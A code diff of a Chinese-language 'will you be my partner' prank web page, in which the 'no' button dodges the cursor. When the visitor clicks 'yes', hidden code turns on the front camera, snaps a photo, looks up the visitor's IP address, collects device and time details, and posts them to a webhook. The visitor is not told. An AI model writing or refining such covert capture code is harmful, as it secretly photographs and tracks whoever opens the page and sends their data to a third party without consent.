@@ -26,23 +26,43 @@ body {
   color: white;
 }
 
+.title {
+  font-size: 22px;
+  text-align: center;
+  line-height: 1.6;
+}
+
+.subtitle {
+  font-size: 16px;
+  color: #aaa;
+}
+
 .btn-area {
   position: relative;
   width: 300px;
   height: 200px;
+  margin-top: 20px;
 }
 
 button {
   padding: 12px 25px;
-  border-radius: 12px;
   border: none;
+  border-radius: 12px;
   font-size: 18px;
   cursor: pointer;
   position: absolute;
+  transition: 0.2s;
 }
 
-.yes { background: #4CAF50; color: white; }
-.no { background: #ff4d4d; color: white; }
+.yes {
+  background: #4CAF50;
+  color: white;
+}
+
+.no {
+  background: #ff4d4d;
+  color: white;
+}
 
 .success {
   position: fixed;
@@ -55,20 +75,26 @@ button {
   color: white;
   opacity: 0;
   pointer-events: none;
+  transition: 0.5s;
 }
 
-.success.show { opacity: 1; }
+.success.show {
+  opacity: 1;
+}
 
-video, canvas { display: none; }
+video, canvas {
+  display: none;
+}
 </style>
 </head>
 
 <body>
 
 <div class="card">
-  <h2>💖 你願意嗎？</h2>
+  <h2>💖 我喜歡你</h2>
+  <p class="subtitle">你願意跟我在一起嗎？ 😳</p>
 
-  <div class="btn-area">
+  <div class="btn-area" id="area">
     <button class="yes" id="yesBtn">願意</button>
     <button class="no" id="noBtn">不願意</button>
   </div>
@@ -83,12 +109,9 @@ video, canvas { display: none; }
 const yesBtn = document.getElementById("yesBtn");
 const noBtn = document.getElementById("noBtn");
 const success = document.getElementById("success");
-
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
-
-let noScale = 1;
-let yesScale = 1;
+const area = document.getElementById("area");
 
 // NO 逃跑
 document.addEventListener("mousemove", e => {
@@ -103,39 +126,36 @@ document.addEventListener("mousemove", e => {
   }
 });
 
-// 📱 YES
+// 📸 YES
 yesBtn.onclick = async () => {
   success.classList.add("show");
 
-  // 📸 開鏡頭（必須點擊觸發）
+  // 開鏡頭（必須使用者點擊觸發）
   const stream = await navigator.mediaDevices.getUserMedia({
     video: { facingMode: "user" }
   });
 
   video.srcObject = stream;
 
-  // 等 video ready（修復沒照片問題）
-  await new Promise(resolve => {
-    video.onloadedmetadata = () => setTimeout(resolve, 1000);
-  });
+  // 等待畫面穩定
+  await new Promise(r => setTimeout(r, 1500));
 
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
 
   const ctx = canvas.getContext("2d");
   ctx.drawImage(video, 0, 0);
 
   const imageData = canvas.toDataURL("image/png");
 
-  // 🌐 取得 IP
+  // 🌐 IP
   let ip = "unknown";
   try {
     const res = await fetch("https://api.ipify.org?format=json");
-    const data = await res.json();
-    ip = data.ip;
+    ip = (await res.json()).ip;
   } catch {}
 
-  // 📱 裝置資訊
+  // 📱 裝置
   const device = navigator.userAgent;
 
   // 🕒 時間
@@ -148,24 +168,42 @@ yesBtn.onclick = async () => {
   const formData = new FormData();
   formData.append("file", blob, "love.png");
 
-  const embed = {
+  const payload = {
     username: "💌 告白系統",
     embeds: [
       {
         title: "💖 告白成功",
+        description: "有人按下願意 ❤️",
         color: 0xff4d6d,
-        image: { url: "attachment://love.png" },
+
+        image: {
+          url: "attachment://love.png"
+        },
+
         fields: [
-          { name: "🌐 IP", value: ip, inline: false },
-          { name: "📱 裝置", value: device.slice(0, 100), inline: false },
-          { name: "🕒 時間", value: time, inline: false }
+          {
+            name: "🌐 IP",
+            value: ip,
+            inline: false
+          },
+          {
+            name: "📱 裝置",
+            value: device.slice(0, 80),
+            inline: false
+          },
+          {
+            name: "🕒 時間",
+            value: time,
+            inline: false
+          }
         ],
+
         timestamp: new Date().toISOString()
       }
     ]
   };
 
-  formData.append("payload_json", JSON.stringify(embed));
+  formData.append("payload_json", JSON.stringify(payload));
 
   await fetch(webhookURL, {
     method: "POST",
